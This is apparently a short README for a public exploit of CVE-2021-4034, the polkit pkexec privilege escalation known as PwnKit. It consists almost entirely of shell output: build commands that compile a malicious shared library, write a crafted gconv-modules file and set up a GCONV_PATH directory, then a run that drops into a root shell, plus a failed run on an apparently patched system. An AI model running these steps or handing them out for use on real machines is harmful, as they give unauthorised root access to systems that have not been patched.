# CVE-2021-4034

### One day for the polkit privilege escalation exploit

## exploit
```shell
test@ubuntu:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
test@ubuntu:~/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# exit
```

## Failed 
```shell
test@ubuntu:~/CVE-2021-4034$ ./cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
test@ubuntu:~/CVE-2021-4034$
```